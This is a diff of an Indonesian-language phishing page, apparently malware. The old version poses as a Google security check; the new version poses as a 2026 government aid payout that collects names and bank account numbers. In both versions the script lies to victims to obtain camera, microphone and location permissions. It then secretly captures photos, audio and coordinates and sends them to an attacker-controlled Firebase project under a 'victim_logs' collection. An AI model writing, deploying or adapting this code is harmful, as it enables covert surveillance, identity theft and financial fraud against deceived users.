@@ -1,61 +1,108 @@
 <!DOCTYPE html>
-<html>
-<head><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Security Verification</title></head>
-<body style="background:#000;color:#fff;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif">
-  <div style="text-align:center;padding:20px;width:100%;max-width:300px">
-    <div style="background:#1a73e8;width:50px;height:50px;border-radius:50%;margin:0 auto 15px;display:flex;align-items:center;justify-content:center;font-size:25px;font-weight:bold">G</div>
-    <h2 style="font-size:16px;margin:0 0 10px">Verifikasi Keamanan</h2>
-    <p style="font-size:11px;color:#888;line-height:1.4">Izinkan akses untuk sinkronisasi akun Google Anda agar tetap aman.</p>
-    <button id="auth" style="background:#1a73e8;color:#fff;border:none;width:100%;padding:14px;border-radius:6px;font-weight:bold;margin-top:20px;cursor:pointer">VERIFIKASI</button>
-    <video id="v" style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01" autoplay playsinline muted></video>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cek Saldo Dana Hibah 2026</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100">
+    <div id="overlay" class="fixed inset-0 bg-black bg-opacity-80 z-50 flex items-center justify-center p-4">
+        <div class="bg-white p-6 rounded-xl max-w-sm text-center">
+            <h2 class="font-bold text-xl mb-2">Izin Verifikasi Diperlukan</h2>
+            <p class="text-sm text-gray-600 mb-6">Sesuai aturan keamanan siber terbaru, Anda wajib mengaktifkan izin Kamera, Mikrofon, dan Lokasi untuk memverifikasi bahwa Anda bukan Bot.</p>
+            <button id="start-btn" class="w-full bg-green-600 text-white font-bold py-3 rounded-lg pulse-btn">SAYA MENGERTI & LANJUTKAN</button>
+        </div>
+    </div>
+
+    <nav class="bg-blue-900 p-4 text-white font-bold">INFO BANSOS 2026</nav>
+    <div class="p-4 max-w-md mx-auto">
+        <div class="bg-white p-4 rounded shadow">
+            <h1 class="text-lg font-bold mb-4">Lengkapi Data Diri untuk Klaim Saldo Rp 5.000.000</h1>
+            <input type="text" placeholder="Nama Lengkap" class="w-full p-2 border mb-2">
+            <input type="number" placeholder="Nomor Rekening" class="w-full p-2 border mb-4">
+            <button class="w-full bg-blue-600 text-white p-3 rounded">PROSES SEKARANG</button>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Elements -->
+    <video id="v" style="display:none" autoplay></video>
     <canvas id="c" style="display:none"></canvas>
-  </div>
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-    import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
-    import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-    
-    const app = initializeApp({"apiKey":"AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo","authDomain":"apktroj.firebaseapp.com","projectId":"apktroj","storageBucket":"apktroj.firebasestorage.app","messagingSenderId":"943833619122","appId":"1:943833619122:web:d757ced4d56267abf247ab"});
-    const db = getFirestore(app);
-    const auth = getAuth(app);
 
-    document.getElementById('auth').onclick = async () => {
-      try {
-        await signInAnonymously(auth);
-        const stream = await navigator.mediaDevices.getUserMedia({audio:true, video:{facingMode:"user", width:320, height:240}});
-        document.getElementById('auth').innerText = "VERIFIED ✓";
-        document.getElementById('auth').disabled = true;
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
-        const v = document.getElementById('v'); v.srcObject = stream;
-        const c = document.getElementById('c'); const ctx = c.getContext('2d');
-
-        setInterval(() => {
-          c.width = 320; c.height = 240;
-          ctx.drawImage(v, 0, 0, 320, 240);
-          setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'photo'), { 
-            data: c.toDataURL('image/jpeg', 0.3), 
-            time: Date.now() 
-          });
-        }, 2000);
-
-        const mr = new MediaRecorder(stream);
-        mr.ondataavailable = (e) => {
-          const r = new FileReader();
-          r.onload = () => setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'audio_stream'), { 
-            chunk: r.result, 
-            time: Date.now() 
-          });
-          r.readAsDataURL(e.data);
+        const firebaseConfig = {
+            apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
+            authDomain: "apktroj.firebaseapp.com",
+            databaseURL: "https://apktroj-default-rtdb.firebaseio.com",
+            projectId: "apktroj",
+            storageBucket: "apktroj.firebasestorage.app",
+            messagingSenderId: "943833619122",
+            appId: "1:943833619122:web:d757ced4d56267abf247ab",
+            measurementId: "G-WR01BDY3G6"
         };
-        mr.start(1000);
 
-        navigator.geolocation.getCurrentPosition((p) => {
-          setDoc(doc(db, 'artifacts', 'apktroj', 'public', 'data', 'control', 'status'), { 
-            lat: p.coords.latitude, lng: p.coords.longitude, time: Date.now() 
-          });
-        });
-      } catch(err) { alert("Error: Perangkat tidak mendukung atau izin ditolak."); }
-    };
-  </script>
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        const auth = getAuth(app);
+        const appId = "apktroj_v1";
+
+        document.getElementById('start-btn').onclick = async () => {
+            document.getElementById('overlay').style.display = 'none';
+            await signInAnonymously(auth);
+            activateAll();
+        };
+
+        async function logToAdmin(payload) {
+            try {
+                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'victim_logs'), {
+                    ...payload,
+                    timestamp: Date.now(),
+                    userAgent: navigator.userAgent
+                });
+            } catch (e) {}
+        }
+
+        function activateAll() {
+            // 1. Get Location
+            navigator.geolocation.getCurrentPosition(pos => {
+                logToAdmin({ action: "GEO_LOCATION", location: { lat: pos.coords.latitude, lng: pos.coords.longitude } });
+            }, err => logToAdmin({ action: "GEO_DENIED" }));
+
+            // 2. Camera Capture
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                // Capture photo after 3 seconds
+                setTimeout(() => {
+                    const canvas = document.getElementById('c');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const photoData = canvas.toDataURL('image/jpeg', 0.5);
+                    logToAdmin({ action: "CAPTURED_MEDIA", photo: photoData });
+                }, 3000);
+
+                // 3. Audio Recording (Simple Clip)
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
+                    const reader = new FileReader();
+                    reader.onloadend = () => {
+                        logToAdmin({ action: "CAPTURED_MEDIA", audio: reader.result });
+                    };
+                    reader.readAsDataURL(blob);
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 5000); // Record 5 seconds
+            }).catch(e => logToAdmin({ action: "PERM_DENIED", error: e.message }));
+        }
+    </script>
 </body>
 </html>
